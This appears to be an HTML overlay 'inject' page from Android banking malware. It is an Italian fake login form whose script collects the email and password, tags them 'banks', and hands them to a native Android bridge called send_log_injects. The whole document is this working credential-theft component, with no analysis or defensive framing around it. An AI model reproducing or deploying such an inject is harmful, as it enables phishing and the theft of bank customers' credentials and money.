    <section>
        <form onsubmit="return false">
            <label for="email" > Indirizzo email </label>
            <input type="email" name="email" class="input" id="email" autocomplete="off" required>

            <label for="password"> Password </label>
            <input type="password" name="password" class="input" id="password" autocomplete="off" required>
            <input type="hidden" name="exit">

            <input type="submit" id="send_data" value="Accedi">
        </form>

    <script>
        var btn = document.getElementById('send_data');
        
        var emailField = document.getElementById('email'),
            passField = document.getElementById('password');

        btn.onclick = function(){
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(emailField.value)) {
                emailField.classList.add('error');
            } else {
                emailField.classList.remove('error');
            } 

            if(passField.value.length < 3) {
                passField.classList.add('error');
            } else {
                passField.classList.remove('error');
            } 

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(emailField.value) && passField.value.length > 3){
                var data = {};
                data.email = email.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }

        }
                
    </script>
